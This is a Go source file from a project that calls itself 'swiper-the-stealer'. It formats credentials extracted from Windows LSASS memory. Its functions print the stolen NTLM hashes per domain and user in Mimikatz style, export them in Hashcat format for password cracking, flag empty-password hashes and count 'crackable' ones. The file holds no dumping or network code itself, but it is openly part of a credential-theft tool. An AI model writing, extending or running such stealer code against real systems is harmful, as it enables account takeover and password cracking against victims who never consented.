package lsass

import (
	"encoding/hex"
	"fmt"
	"strings"

	"swiper-the-stealer/pkg/logger"
)

// CredentialFormatter handles pretty-printing of extracted credentials
type CredentialFormatter struct {
	logger *logger.Logger
}

// NewCredentialFormatter creates a new formatter
func NewCredentialFormatter(logger *logger.Logger) *CredentialFormatter {
	return &CredentialFormatter{
		logger: logger,
	}
}

// FormatAndDisplay - Display credentials in Mimikatz-style output
func (cf *CredentialFormatter) FormatAndDisplay(credentials []Credential) {
	if len(credentials) == 0 {
		cf.logger.Warn("╔══════════════════════════════════════════════════════════════╗")
		cf.logger.Warn("║                   NO CREDENTIALS FOUND                       ║")
		cf.logger.Warn("╚══════════════════════════════════════════════════════════════╝")
		return
	}

	cf.logger.Info("╔══════════════════════════════════════════════════════════════╗")
	cf.logger.Info("║              EXTRACTED LSASS CREDENTIALS                     ║")
	cf.logger.Info("╚══════════════════════════════════════════════════════════════╝")
	cf.logger.Info("")

	// Group credentials by domain\username
	credMap := make(map[string][]Credential)
	for _, cred := range credentials {
		key := fmt.Sprintf("%s\\%s", cred.Domain, cred.Username)
		credMap[key] = append(credMap[key], cred)
	}

	count := 0
	for key, creds := range credMap {
		count++
		parts := strings.Split(key, "\\")
		domain := parts[0]
		username := parts[1]

		cf.logger.Info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		cf.logger.Info(fmt.Sprintf("  [%d] %s", count, key))
		cf.logger.Info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		cf.logger.Info(fmt.Sprintf("  Domain   : %s", domain))
		cf.logger.Info(fmt.Sprintf("  Username : %s", username))

		// Display all credential types for this user
		for _, cred := range creds {
			if cred.Type != "" {
				cf.logger.Info(fmt.Sprintf("  %-9s: %s", cred.Type, cred.NTLM))
			} else if cred.NTLM != "" {
				cf.logger.Info(fmt.Sprintf("  NTLM     : %s", cred.NTLM))
			}
		}
		cf.logger.Info("")
	}

	cf.logger.Info("╔══════════════════════════════════════════════════════════════╗")
	cf.logger.Info(fmt.Sprintf("║  Total Unique Accounts: %-32d ║", len(credMap)))
	cf.logger.Info(fmt.Sprintf("║  Total Credentials:     %-32d ║", len(credentials)))
	cf.logger.Info("╚══════════════════════════════════════════════════════════════╝")
}

// ExportToHashcat - Export credentials in Hashcat format
func (cf *CredentialFormatter) ExportToHashcat(credentials []Credential, filename string) error {
	if len(credentials) == 0 {
		return fmt.Errorf("no credentials to export")
	}

	var output strings.Builder

	// NTLM format: username:hash
	for _, cred := range credentials {
		if cred.NTLM != "" && len(cred.NTLM) == 32 {
			output.WriteString(fmt.Sprintf("%s\\%s:%s\n", cred.Domain, cred.Username, cred.NTLM))
		}
	}

	// Write to file (implement file writing if needed)
	cf.logger.Infof("Hashcat export: %d hashes", len(credentials))
	cf.logger.Info(output.String())

	return nil
}

// ValidateNTLMHash - Check if NTLM hash is valid format
func (cf *CredentialFormatter) ValidateNTLMHash(hash string) bool {
	if len(hash) != 32 {
		return false
	}

	// Check if hex
	_, err := hex.DecodeString(hash)
	return err == nil
}

// FormatSingleCredential - Format a single credential for display
func (cf *CredentialFormatter) FormatSingleCredential(cred Credential) string {
	return fmt.Sprintf("[%s\\%s] NTLM: %s (Type: %s)",
		cred.Domain, cred.Username, cred.NTLM, cred.Type)
}

// DetectCredentialType - Identify credential type from hash characteristics
func (cf *CredentialFormatter) DetectCredentialType(hash string) string {
	if len(hash) == 32 {
		// Check for common patterns
		if hash == "31d6cfe0d16ae931b73c59d7e0c089c0" {
			return "Empty/Blank"
		}
		if strings.HasPrefix(hash, "00000000") {
			return "Null/Disabled"
		}
		return "NTLM"
	}
	if len(hash) == 40 {
		return "SHA1"
	}
	if len(hash) == 16 {
		return "LM"
	}
	return "Unknown"
}

// SummarizeCredentials - Generate summary statistics
func (cf *CredentialFormatter) SummarizeCredentials(credentials []Credential) {
	uniqueUsers := make(map[string]bool)
	uniqueDomains := make(map[string]bool)
	ntlmCount := 0
	emptyCount := 0

	for _, cred := range credentials {
		uniqueUsers[fmt.Sprintf("%s\\%s", cred.Domain, cred.Username)] = true
		uniqueDomains[cred.Domain] = true

		if cred.NTLM != "" {
			ntlmCount++
			if cred.NTLM == "31d6cfe0d16ae931b73c59d7e0c089c0" {
				emptyCount++
			}
		}
	}

	cf.logger.Info("══════════════ CREDENTIAL SUMMARY ══════════════")
	cf.logger.Info(fmt.Sprintf("Unique Accounts   : %d", len(uniqueUsers)))
	cf.logger.Info(fmt.Sprintf("Unique Domains    : %d", len(uniqueDomains)))
	cf.logger.Info(fmt.Sprintf("NTLM Hashes Found : %d", ntlmCount))
	cf.logger.Info(fmt.Sprintf("Empty Passwords   : %d", emptyCount))
	cf.logger.Info(fmt.Sprintf("Crackable Hashes  : %d", ntlmCount-emptyCount))
	cf.logger.Info("═══════════════════════════════════════════════")
}
